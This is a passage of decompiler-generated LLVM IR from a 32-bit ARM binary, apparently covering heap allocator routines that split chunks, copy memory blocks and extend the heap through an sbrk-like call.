  %v3_11bf4 = load i32, i32* %v2_11bf4, align 4
  store i32 %v3_11bf4, i32* %r3.global-to-local, align 4
  %v9_11bf8 = icmp eq i32 %v3_11bf4, %v2_11b70
  br i1 %v9_11bf8, label %dec_label_pc_11c04, label %dec_label_pc_11c00

dec_label_pc_11c00:                               ; preds = %dec_label_pc_11be0, %dec_label_pc_11bf4
  %v0_11c00 = call i32 @function_12320()
  store i32 %v0_11c00, i32* %r0.global-to-local, align 4
  %v0_11c04.pre = load i32, i32* @r1, align 4
  %v1_11c04.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_11c04

dec_label_pc_11c04:                               ; preds = %dec_label_pc_11bf4, %dec_label_pc_11c00
  %v1_11c04 = phi i32 [ %v3_11bec, %dec_label_pc_11bf4 ], [ %v1_11c04.pre, %dec_label_pc_11c00 ]
  %v0_11c04 = phi i32 [ %v3_11be0, %dec_label_pc_11bf4 ], [ %v0_11c04.pre, %dec_label_pc_11c00 ]
  %v2_11c04 = add i32 %v1_11c04, 8
  %v3_11c04 = inttoptr i32 %v2_11c04 to i32*
  store i32 %v0_11c04, i32* %v3_11c04, align 4
  %v0_11c08 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c08 = load i32, i32* %r1.global-to-local, align 4
  %v2_11c08 = add i32 %v1_11c08, 12
  %v3_11c08 = inttoptr i32 %v2_11c08 to i32*
  store i32 %v0_11c08, i32* %v3_11c08, align 4
  %v1_11cc4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11cc4

dec_label_pc_11c10:                               ; preds = %dec_label_pc_11b80, %dec_label_pc_11bd0, %dec_label_pc_11bbc
  %v1_11c10 = add i32 %v1_11b54, -7
  store i32 %v1_11c10, i32* @r0, align 4
  %v0_11c14 = call i32 @function_11038()
  store i32 %v0_11c14, i32* @r0, align 4
  store i32 %v0_11c14, i32* %r1.global-to-local, align 4
  %v2_11c18 = icmp eq i32 %v0_11c14, 0
  br i1 %v2_11c18, label %bb31, label %dec_label_pc_11c24

bb31:                                             ; preds = %dec_label_pc_11c10
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_11df8

dec_label_pc_11c24:                               ; preds = %dec_label_pc_11c10
  %v1_11c2c.pre = load i32, i32* @r4, align 4
  %v1_11c24 = add i32 %v0_11c14, -4
  %v2_11c24 = inttoptr i32 %v1_11c24 to i32*
  %v3_11c24 = load i32, i32* %v2_11c24, align 4
  store i32 %v3_11c24, i32* @r3, align 4
  %v1_11c28 = add i32 %v0_11c14, -8
  store i32 %v1_11c28, i32* @r7, align 4
  %v9_11c2c = icmp eq i32 %v1_11c28, %v1_11c2c.pre
  br i1 %v9_11c2c, label %.thread2, label %dec_label_pc_11c3c

.thread2:                                         ; preds = %dec_label_pc_11c24
  %v2_11c30 = and i32 %v3_11c24, -4
  store i32 %v2_11c30, i32* %r3.global-to-local, align 4
  %v2_11c34 = load i32, i32* @r6, align 4
  %v3_11c34 = add i32 %v2_11c34, %v2_11c30
  store i32 %v3_11c34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11cc4

dec_label_pc_11c3c:                               ; preds = %dec_label_pc_11c24
  %v0_11c3c = load i32, i32* @r6, align 4
  %v1_11c3c = add i32 %v0_11c3c, -4
  store i32 %v1_11c3c, i32* @r2, align 4
  %v3_11c40 = udiv i32 %v1_11c3c, 4
  store i32 %v3_11c40, i32* @ip, align 4
  %tmp37 = and i32 %v1_11c3c, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_11c48 = icmp ult i32 %v1_11c3c, 36
  %v3_11c48 = or i1 %tmp38, %v2_11c48
  %v0_11c58 = load i32, i32* @r5, align 4
  br i1 %v3_11c48, label %dec_label_pc_11c58, label %dec_label_pc_11c4c

dec_label_pc_11c4c:                               ; preds = %dec_label_pc_11c3c
  store i32 %v0_11c58, i32* @r1, align 4
  %v0_11c50 = call i32 @function_10b30()
  store i32 %v0_11c50, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_11c58:                               ; preds = %dec_label_pc_11c3c
  %v1_11c58 = inttoptr i32 %v0_11c58 to i32*
  %v2_11c58 = load i32, i32* %v1_11c58, align 4
  store i32 %v2_11c58, i32* %r3.global-to-local, align 4
  %v2_11c5c = inttoptr i32 %v0_11c14 to i32*
  store i32 %v2_11c58, i32* %v2_11c5c, align 4
  %v0_11c60 = load i32, i32* @r5, align 4
  %v1_11c60 = add i32 %v0_11c60, 4
  %v2_11c60 = inttoptr i32 %v1_11c60 to i32*
  %v3_11c60 = load i32, i32* %v2_11c60, align 4
  store i32 %v3_11c60, i32* %r3.global-to-local, align 4
  %v1_11c64 = load i32, i32* %r1.global-to-local, align 4
  %v2_11c64 = add i32 %v1_11c64, 4
  %v3_11c64 = inttoptr i32 %v2_11c64 to i32*
  store i32 %v3_11c60, i32* %v3_11c64, align 4
  %v0_11c68 = load i32, i32* @r5, align 4
  %v1_11c68 = add i32 %v0_11c68, 8
  %v2_11c68 = inttoptr i32 %v1_11c68 to i32*
  %v3_11c68 = load i32, i32* %v2_11c68, align 4
  store i32 %v3_11c68, i32* %r3.global-to-local, align 4
  %v0_11c6c = load i32, i32* @ip, align 4
  %v1_11c70 = load i32, i32* %r1.global-to-local, align 4
  %v2_11c70 = add i32 %v1_11c70, 8
  %v3_11c70 = inttoptr i32 %v2_11c70 to i32*
  store i32 %v3_11c68, i32* %v3_11c70, align 4
  %tmp39 = icmp ult i32 %v0_11c6c, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_11c78

dec_label_pc_11c78:                               ; preds = %dec_label_pc_11c58
  %v0_11c78 = load i32, i32* @r5, align 4
  %v1_11c78 = add i32 %v0_11c78, 12
  %v2_11c78 = inttoptr i32 %v1_11c78 to i32*
  %v3_11c78 = load i32, i32* %v2_11c78, align 4
  store i32 %v3_11c78, i32* %r3.global-to-local, align 4
  %v1_11c7c = load i32, i32* %r1.global-to-local, align 4
  %v2_11c7c = add i32 %v1_11c7c, 12
  %v3_11c7c = inttoptr i32 %v2_11c7c to i32*
  store i32 %v3_11c78, i32* %v3_11c7c, align 4
  %v0_11c80 = load i32, i32* @r5, align 4
  %v1_11c80 = add i32 %v0_11c80, 16
  %v2_11c80 = inttoptr i32 %v1_11c80 to i32*
  %v3_11c80 = load i32, i32* %v2_11c80, align 4
  store i32 %v3_11c80, i32* %r3.global-to-local, align 4
  %v0_11c84 = load i32, i32* @ip, align 4
  %v1_11c88 = load i32, i32* %r1.global-to-local, align 4
  %v2_11c88 = add i32 %v1_11c88, 16
  %v3_11c88 = inttoptr i32 %v2_11c88 to i32*
  store i32 %v3_11c80, i32* %v3_11c88, align 4
  %tmp40 = icmp ult i32 %v0_11c84, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_11c90

dec_label_pc_11c90:                               ; preds = %dec_label_pc_11c78
  %v0_11c90 = load i32, i32* @r5, align 4
  %v1_11c90 = add i32 %v0_11c90, 20
  %v2_11c90 = inttoptr i32 %v1_11c90 to i32*
  %v3_11c90 = load i32, i32* %v2_11c90, align 4
  store i32 %v3_11c90, i32* %r3.global-to-local, align 4
  %v1_11c94 = load i32, i32* %r1.global-to-local, align 4
  %v2_11c94 = add i32 %v1_11c94, 20
  %v3_11c94 = inttoptr i32 %v2_11c94 to i32*
  store i32 %v3_11c90, i32* %v3_11c94, align 4
  %v0_11c98 = load i32, i32* @r5, align 4
  %v1_11c98 = add i32 %v0_11c98, 24
  %v2_11c98 = inttoptr i32 %v1_11c98 to i32*
  %v3_11c98 = load i32, i32* %v2_11c98, align 4
  store i32 %v3_11c98, i32* %r3.global-to-local, align 4
  %v1_11c9c = load i32, i32* %r1.global-to-local, align 4
  %v2_11c9c = add i32 %v1_11c9c, 24
  %v3_11c9c = inttoptr i32 %v2_11c9c to i32*
  store i32 %v3_11c98, i32* %v3_11c9c, align 4
  %v0_11ca0 = load i32, i32* @ip, align 4
  %v7_11ca0 = icmp eq i32 %v0_11ca0, 9
  br i1 %v7_11ca0, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_11c90
  %v1_11ca4 = load i32, i32* @r5, align 4
  %v2_11ca4 = add i32 %v1_11ca4, 28
  %v3_11ca4 = inttoptr i32 %v2_11ca4 to i32*
  %v4_11ca4 = load i32, i32* %v3_11ca4, align 4
  store i32 %v4_11ca4, i32* %r3.global-to-local, align 4
  %v2_11ca8 = load i32, i32* %r1.global-to-local, align 4
  %v3_11ca8 = add i32 %v2_11ca8, 28
  %v4_11ca8 = inttoptr i32 %v3_11ca8 to i32*
  store i32 %v4_11ca4, i32* %v4_11ca8, align 4
  %v1_11cac = load i32, i32* @r5, align 4
  %v2_11cac = add i32 %v1_11cac, 32
  %v3_11cac = inttoptr i32 %v2_11cac to i32*
  %v4_11cac = load i32, i32* %v3_11cac, align 4
  store i32 %v4_11cac, i32* %r3.global-to-local, align 4
  %v2_11cb0 = load i32, i32* %r1.global-to-local, align 4
  %v3_11cb0 = add i32 %v2_11cb0, 32
  %v4_11cb0 = inttoptr i32 %v3_11cb0 to i32*
  store i32 %v4_11cac, i32* %v4_11cb0, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_11c90, %dec_label_pc_11c78, %dec_label_pc_11c58, %dec_label_pc_11c4c, %bb32
  %v0_11cb4 = load i32, i32* @r5, align 4
  store i32 %v0_11cb4, i32* @r0, align 4
  %v0_11cb8 = call i32 @function_120a4()
  store i32 %v0_11cb8, i32* %r0.global-to-local, align 4
  %v0_11cbc = load i32, i32* @r7, align 4
  %v1_11cbc = add i32 %v0_11cbc, 8
  store i32 %v1_11cbc, i32* @r4, align 4
  br label %dec_label_pc_11df8

dec_label_pc_11cc4:                               ; preds = %bb30, %.thread2, %dec_label_pc_11c04
  %v0_11cd8 = phi i32 [ %v3_11c34, %.thread2 ], [ %v1_11b4c, %bb30 ], [ %v1_11cc4.pre, %dec_label_pc_11c04 ]
  %v0_11cc4 = load i32, i32* @sb, align 4
  %v2_11cc4 = sub i32 %v0_11cd8, %v0_11cc4
  store i32 %v2_11cc4, i32* %r1.global-to-local, align 4
  %v0_11ccc = load i32, i32* @sl, align 4
  %v1_11ccc = add i32 %v0_11ccc, 4
  %v2_11ccc = inttoptr i32 %v1_11ccc to i32*
  %v3_11ccc = load i32, i32* %v2_11ccc, align 4
  %tmp41 = icmp ugt i32 %v2_11cc4, 15
  %v1_11cf4 = urem i32 %v3_11ccc, 2
  store i32 %v1_11cf4, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_11cf4, label %dec_label_pc_11cd4

dec_label_pc_11cd4:                               ; preds = %dec_label_pc_11cc4
  %v2_11cd8 = or i32 %v1_11cf4, %v0_11cd8
  store i32 %v2_11cd8, i32* %r3.global-to-local, align 4
  store i32 %v2_11cd8, i32* %v2_11ccc, align 4
  %v0_11ce0 = load i32, i32* @sl, align 4
  %v1_11ce0 = load i32, i32* %r0.global-to-local, align 4
  %v2_11ce0 = add i32 %v1_11ce0, %v0_11ce0
  store i32 %v2_11ce0, i32* %r2.global-to-local, align 4
  %v1_11ce4 = add i32 %v2_11ce0, 4
  %v2_11ce4 = inttoptr i32 %v1_11ce4 to i32*
  %v3_11ce4 = load i32, i32* %v2_11ce4, align 4
  %v1_11ce8 = or i32 %v3_11ce4, 1
  store i32 %v1_11ce8, i32* %r3.global-to-local, align 4
  store i32 %v1_11ce8, i32* %v2_11ce4, align 4
  br label %dec_label_pc_11d24

dec_label_pc_11cf4:                               ; preds = %dec_label_pc_11cc4
  %v2_11cf8 = add i32 %v0_11ccc, %v0_11cc4
  store i32 %v2_11cf8, i32* %r0.global-to-local, align 4
  %v2_11cfc = or i32 %v1_11cf4, %v0_11cc4
  store i32 %v2_11cfc, i32* %r3.global-to-local, align 4
  %v1_11d00 = or i32 %v2_11cc4, 1
  store i32 %v1_11d00, i32* %r2.global-to-local, align 4
  store i32 %v2_11cfc, i32* %v2_11ccc, align 4
  %v0_11d08 = load i32, i32* %r2.global-to-local, align 4
  %v1_11d08 = load i32, i32* %r0.global-to-local, align 4
  %v2_11d08 = add i32 %v1_11d08, 4
  %v3_11d08 = inttoptr i32 %v2_11d08 to i32*
  store i32 %v0_11d08, i32* %v3_11d08, align 4
  %v0_11d0c = load i32, i32* %r0.global-to-local, align 4
  %v1_11d0c = load i32, i32* %r1.global-to-local, align 4
  %v2_11d0c = add i32 %v1_11d0c, %v0_11d0c
  store i32 %v2_11d0c, i32* %r2.global-to-local, align 4
  %v1_11d10 = add i32 %v2_11d0c, 4
  %v2_11d10 = inttoptr i32 %v1_11d10 to i32*
  %v3_11d10 = load i32, i32* %v2_11d10, align 4
  %v1_11d14 = or i32 %v3_11d10, 1
  store i32 %v1_11d14, i32* %r3.global-to-local, align 4
  store i32 %v1_11d14, i32* %v2_11d10, align 4
  %v0_11d1c = load i32, i32* %r0.global-to-local, align 4
  %v1_11d1c = add i32 %v0_11d1c, 8
  store i32 %v1_11d1c, i32* @r0, align 4
  %v0_11d20 = call i32 @function_120a4()
  store i32 %v0_11d20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11d24

dec_label_pc_11d24:                               ; preds = %dec_label_pc_11cd4, %dec_label_pc_11cf4
  %v0_11d24 = load i32, i32* @sl, align 4
  %v1_11d24 = add i32 %v0_11d24, 8
  store i32 %v1_11d24, i32* @r4, align 4
  br label %dec_label_pc_11df8

dec_label_pc_11d2c:                               ; preds = %bb29
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 123764, i32* %r1.global-to-local, align 4
  %v4_11d34 = load i32, i32* inttoptr (i32 123796 to i32*), align 4
  store i32 %v4_11d34, i32* @r8, align 4
  %v2_11d38 = inttoptr i32 %v1_11b48 to i32*
  %v3_11d38 = load i32, i32* %v2_11d38, align 4
  store i32 %v3_11d38, i32* @r4, align 4
  %v1_11d3c = add i32 %v4_11d34, 860
  %v2_11d3c = inttoptr i32 %v1_11d3c to i32*
  %v3_11d3c = load i32, i32* %v2_11d3c, align 4
  %v1_11d40 = add i32 %v3_11d38, 4
  %v1_11d44 = add i32 %v3_11d3c, -1
  store i32 %v1_11d44, i32* %r2.global-to-local, align 4
  %v2_11d48 = add i32 %v1_11d40, %v1_11d44
  %v1_11d4c = load i32, i32* @sb, align 4
  %v2_11d4c = add i32 %v2_11d48, %v1_11d4c
  store i32 %v2_11d4c, i32* %r3.global-to-local, align 4
  %v2_11d50 = sub i32 0, %v3_11d3c
  %v3_11d50 = and i32 %v2_11d4c, %v2_11d50
  store i32 %v3_11d50, i32* @r7, align 4
  %v2_11d54 = sub i32 %v3_11d50, %v3_11d38
  store i32 %v2_11d54, i32* @fp, align 4
  %v9_11d58 = icmp eq i32 %v1_11b4c, %v2_11d54
  br i1 %v9_11d58, label %dec_label_pc_11dcc, label %dec_label_pc_11d60

dec_label_pc_11d60:                               ; preds = %dec_label_pc_11d2c
  %v2_11d60 = sub i32 %v1_11b48, %v3_11d38
  store i32 %v2_11d60, i32* %r0.global-to-local, align 4
  %v2_11d64 = add i32 %v3_11d38, %v1_11b4c
  store i32 %v2_11d64, i32* %r1.global-to-local, align 4
  store i32 %v3_11d50, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_11d70 = call i32 @function_138f0(i32 %v2_11d60, i32 %v2_11d64, i32 %v3_11d50, i32 1)
  store i32 %v4_11d70, i32* %r0.global-to-local, align 4
  %v7_11d74 = icmp eq i32 %v4_11d70, -1
  br i1 %v7_11d74, label %dec_label_pc_11dc0, label %dec_label_pc_11d7c

dec_label_pc_11d7c:                               ; preds = %dec_label_pc_11d60
  %v1_11d7c = load i32, i32* @r4, align 4
  %v2_11d7c = add i32 %v1_11d7c, %v4_11d70
  store i32 %v2_11d7c, i32* %r0.global-to-local, align 4
  %v0_11d80 = load i32, i32* @fp, align 4
  %v1_11d80 = or i32 %v0_11d80, 2
  store i32 %v1_11d80, i32* %r3.global-to-local, align 4
  %v2_11d84 = add i32 %v2_11d7c, 4
  %v3_11d84 = inttoptr i32 %v2_11d84 to i32*
  store i32 %v1_11d80, i32* %v3_11d84, align 4
  %v0_11d88 = load i32, i32* @r8, align 4
  %v1_11d88 = add i32 %v0_11d88, 868
  %v2_11d88 = inttoptr i32 %v1_11d88 to i32*
  %v3_11d88 = load i32, i32* %v2_11d88, align 4
  store i32 %v3_11d88, i32* %r3.global-to-local, align 4
  %v1_11d8c = add i32 %v0_11d88, 880
  %v2_11d8c = inttoptr i32 %v1_11d8c to i32*
  %v3_11d8c = load i32, i32* %v2_11d8c, align 4
  store i32 %v3_11d8c, i32* %r2.global-to-local, align 4
  %v0_11d90 = load i32, i32* @r6, align 4
  %v2_11d90 = sub i32 %v3_11d88, %v0_11d90
  store i32 %v2_11d90, i32* %r3.global-to-local, align 4
  %v1_11d94 = load i32, i32* @r7, align 4
  %v2_11d94 = add i32 %v1_11d94, %v2_11d90
  store i32 %v2_11d94, i32* %r1.global-to-local, align 4
  %v1_11d98 = add i32 %v0_11d88, 872
  %v2_11d98 = inttoptr i32 %v1_11d98 to i32*
  %v3_11d98 = load i32, i32* %v2_11d98, align 4
  store i32 %v3_11d98, i32* %r3.global-to-local, align 4
  %v1_11da0 = add i32 %v0_11d88, 884
  %v2_11da0 = inttoptr i32 %v1_11da0 to i32*
  %v3_11da0 = load i32, i32* %v2_11da0, align 4
  store i32 %v3_11da0, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_11d94, %v3_11d8c
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_11d7c
  store i32 %v2_11d94, i32* %v2_11d8c, align 4
  %v0_11da8.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_11da8.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_11d7c, %bb33
  %v1_11da8 = phi i32 [ %v0_11d88, %dec_label_pc_11d7c ], [ %v1_11da8.pre, %bb33 ]
  %v0_11da8 = phi i32 [ %v2_11d94, %dec_label_pc_11d7c ], [ %v0_11da8.pre, %bb33 ]
  %v2_11da8 = add i32 %v1_11da8, 868
  %v3_11da8 = inttoptr i32 %v2_11da8 to i32*
  store i32 %v0_11da8, i32* %v3_11da8, align 4
  %v0_11dac = load i32, i32* %r1.global-to-local, align 4
  %v1_11dac = load i32, i32* %r3.global-to-local, align 4
  %v2_11dac = add i32 %v1_11dac, %v0_11dac
  store i32 %v2_11dac, i32* %r1.global-to-local, align 4
  %v1_11db0 = load i32, i32* %r2.global-to-local, align 4
  %v0_11db4 = load i32, i32* %r0.global-to-local, align 4
  %v1_11db4 = add i32 %v0_11db4, 8
  store i32 %v1_11db4, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_11dac, %v1_11db0
  br i1 %tmp43, label %bb35, label %dec_label_pc_11df8

bb35:                                             ; preds = %bb34
  %v5_11db8 = load i32, i32* @r8, align 4
  %v6_11db8 = add i32 %v5_11db8, 884
  %v7_11db8 = inttoptr i32 %v6_11db8 to i32*
  store i32 %v2_11dac, i32* %v7_11db8, align 4
  br label %dec_label_pc_11df8

dec_label_pc_11dc0:                               ; preds = %dec_label_pc_11d60
  %v0_11dc0 = load i32, i32* @sb, align 4
  %v1_11dc0 = add i32 %v0_11dc0, 4
  store i32 %v1_11dc0, i32* %r3.global-to-local, align 4
  %v0_11dc4 = load i32, i32* @r6, align 4
  %v3_11dc4 = icmp ult i32 %v0_11dc4, %v1_11dc0
  br i1 %v3_11dc4, label %dec_label_pc_11dd4, label %dec_label_pc_11dc0.dec_label_pc_11dcc_crit_edge

dec_label_pc_11dc0.dec_label_pc_11dcc_crit_edge:  ; preds = %dec_label_pc_11dc0
  %v0_11dcc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11dcc

dec_label_pc_11dcc:                               ; preds = %dec_label_pc_11dc0.dec_label_pc_11dcc_crit_edge, %dec_label_pc_11d2c
  %v0_11dcc = phi i32 [ %v0_11dcc.pre, %dec_label_pc_11dc0.dec_label_pc_11dcc_crit_edge ], [ %v0_11b34, %dec_label_pc_11d2c ]
  store i32 %v0_11dcc, i32* @r4, align 4
  br label %dec_label_pc_11df8

dec_label_pc_11dd4:                               ; preds = %dec_label_pc_11dc0
  %v1_11dd4 = add i32 %v0_11dc0, -7
  store i32 %v1_11dd4, i32* @r0, align 4
  %v0_11dd8 = call i32 @function_11038()
  store i32 %v0_11dd8, i32* @r0, align 4
  store i32 %v0_11dd8, i32* @r4, align 4
  %v2_11ddc = icmp eq i32 %v0_11dd8, 0
  br i1 %v2_11ddc, label %dec_label_pc_11df8, label %dec_label_pc_11de4

dec_label_pc_11de4:                               ; preds = %dec_label_pc_11dd4
  %v0_11de4 = load i32, i32* @r6, align 4
  %v1_11de4 = add i32 %v0_11de4, -8
  store i32 %v1_11de4, i32* @r2, align 4
  %v0_11de8 = load i32, i32* @r5, align 4
  store i32 %v0_11de8, i32* @r1, align 4
  %v0_11dec = call i32 @function_10b30()
  %v0_11df0 = load i32, i32* @r5, align 4
  store i32 %v0_11df0, i32* @r0, align 4
  %v0_11df4 = call i32 @function_120a4()
  store i32 %v0_11df4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11df8

dec_label_pc_11df8:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_11dd4, %dec_label_pc_11dcc, %dec_label_pc_11d24, %.thread6, %dec_label_pc_11b94, %dec_label_pc_11de4
  store i32 %v2_11ae8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  store i32 123764, i32* %r2.global-to-local, align 4
  %v4_11e08 = load i32, i32* inttoptr (i32 123788 to i32*), align 4
  store i32 %v4_11e08, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_11e08)
  br label %dec_label_pc_11e14

dec_label_pc_11e14:                               ; preds = %dec_label_pc_11b1c, %dec_label_pc_11ac4, %dec_label_pc_11aac, %dec_label_pc_11df8
  %v0_11e14 = load i32, i32* @r4, align 4
  store i32 %v0_11e14, i32* %r0.global-to-local, align 4
  store i32 %v3_11a8c, i32* @r4, align 4
  store i32 %v6_11a8c, i32* @r5, align 4
  store i32 %v9_11a8c, i32* @r6, align 4
  store i32 %v12_11a8c, i32* @r7, align 4
  store i32 %v15_11a8c, i32* @r8, align 4
  store i32 %v18_11a8c, i32* @sb, align 4
  store i32 %v21_11a8c, i32* @sl, align 4
  store i32 %v24_11a8c, i32* @fp, align 4
  store i32 %v27_11a8c, i32* @lr, align 4
  ret i32 %v0_11e14

; uselistorder directives
  uselistorder i32 %v2_11dac, { 1, 0, 2 }
  uselistorder i32 %v2_11d94, { 1, 2, 0, 3 }
  uselistorder i32 %v4_11d70, { 1, 0, 2 }
  uselistorder i32 %v3_11d50, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11cf4, { 2, 1, 0 }
  uselistorder i32 %v2_11cc4, { 1, 0, 2 }
  uselistorder i32 %v0_11c58, { 1, 0 }
  uselistorder i32 %v0_11c14, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_11b78, { 0, 2, 1, 3 }
  uselistorder i32 %v2_11b70, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_11b54, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_11b4c, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_11b48, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_11b38, { 1, 0 }
  uselistorder i32 %v0_11b34, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_11b14, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 27, 5, 10, 6, 7, 8, 9, 20, 11, 13, 12, 19, 21, 14, 15, 16, 17, 18, 24, 23, 22, 25, 26 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_11e14, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11df8, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_11d24, { 1, 0 }
  uselistorder label %dec_label_pc_11cc4, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_11c10, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11c04, { 1, 0 }
  uselistorder label %dec_label_pc_11c00, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_11e28(i32 %arg1) local_unnamed_addr {
dec_label_pc_11e28:
  %v0_11e28 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11e28, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_11e28
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_11e28, %bb
  %v10_11e3c = phi i32 [ %arg1, %dec_label_pc_11e28 ], [ 0, %bb ]
  ret i32 %v10_11e3c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_11e40(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11e40:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_11e40 = add i32 %arg2, 44
  %v2_11e40 = inttoptr i32 %v1_11e40 to i32*
  %v3_11e40 = load i32, i32* %v2_11e40, align 4
  %v1_11e48 = add i32 %v3_11e40, 4
  %v2_11e48 = inttoptr i32 %v1_11e48 to i32*
  %v3_11e48 = load i32, i32* %v2_11e48, align 4
  %v1_11e4c = add i32 %arg2, 860
  %v2_11e4c = inttoptr i32 %v1_11e4c to i32*
  %v3_11e4c = load i32, i32* %v2_11e4c, align 4
  store i32 %v3_11e4c, i32* @r4, align 4
  %v1_11e50 = and i32 %v3_11e48, -4
  store i32 %v1_11e50, i32* @r6, align 4
  %v1_11e54 = add i32 %v1_11e50, -17
  %v2_11e58 = add i32 %v1_11e54, %v3_11e4c
  store i32 %arg2, i32* @r5, align 4
  %v2_11e64 = sub i32 %v2_11e58, %arg1
  store i32 %v2_11e64, i32* @r0, align 4
  store i32 %v3_11e4c, i32* @r1, align 4
  %v0_11e6c = call i32 @function_ff2c()
  %v1_11e70 = add i32 %v0_11e6c, -1
  store i32 %v1_11e70, i32* %r0.global-to-local, align 4
  %v0_11e74 = load i32, i32* @r4, align 4
  %v2_11e74 = mul i32 %v0_11e74, %v1_11e70
  store i32 %v2_11e74, i32* %r7.global-to-local, align 4
  %v2_11e78 = icmp eq i32 %v2_11e74, 0
  store i1 %v2_11e78, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_11e74, 1
  br i1 %tmp8, label %dec_label_pc_11ee0, label %dec_label_pc_11e80

dec_label_pc_11e80:                               ; preds = %dec_label_pc_11e40
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_11e84 = call i32 @function_135ac(i32 0)
  store i32 %v1_11e84, i32* %r0.global-to-local, align 4
  %v0_11e88 = load i32, i32* @r5, align 4
  %v1_11e88 = add i32 %v0_11e88, 44
  %v2_11e88 = inttoptr i32 %v1_11e88 to i32*
  %v3_11e88 = load i32, i32* %v2_11e88, align 4
  %v0_11e8c = load i32, i32* @r6, align 4
  %v2_11e8c = add i32 %v0_11e8c, %v3_11e88
  %v9_11e90 = icmp eq i32 %v1_11e84, %v2_11e8c
  store i1 %v9_11e90, i1* @cpsr_z, align 1
  store i32 %v1_11e84, i32* @r4, align 4
  br i1 %v9_11e90, label %dec_label_pc_11e9c, label %dec_label_pc_11ee0

dec_label_pc_11e9c:                               ; preds = %dec_label_pc_11e80
  %v0_11e9c = load i32, i32* %r7.global-to-local, align 4
  %v1_11e9c = sub i32 0, %v0_11e9c
  store i32 %v1_11e9c, i32* %r0.global-to-local, align 4
  %v1_11ea0 = call i32 @function_135ac(i32 %v1_11e9c)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_11ea8 = call i32 @function_135ac(i32 0)
  store i32 %v1_11ea8, i32* %r0.global-to-local, align 4
  %v7_11eac = icmp eq i32 %v1_11ea8, -1
  store i1 %v7_11eac, i1* @cpsr_z, align 1
  br i1 %v7_11eac, label %dec_label_pc_11ee0, label %dec_label_pc_11eb4

dec_label_pc_11eb4:                               ; preds = %dec_label_pc_11e9c
  %v0_11eb4 = load i32, i32* @r4, align 4
  %v2_11eb4 = sub i32 %v0_11eb4, %v1_11ea8
  store i32 %v2_11eb4, i32* %r0.global-to-local, align 4
  %v9_11eb4 = icmp eq i32 %v0_11eb4, %v1_11ea8
  store i1 %v9_11eb4, i1* @cpsr_z, align 1
  br i1 %v9_11eb4, label %dec_label_pc_11ee0, label %dec_label_pc_11ebc

dec_label_pc_11ebc:                               ; preds = %dec_label_pc_11eb4
  %v0_11ebc = load i32, i32* @r5, align 4
  %v1_11ebc = add i32 %v0_11ebc, 872
  %v2_11ebc = inttoptr i32 %v1_11ebc to i32*
  %v3_11ebc = load i32, i32* %v2_11ebc, align 4
  %v1_11ec0 = load i32, i32* @r6, align 4
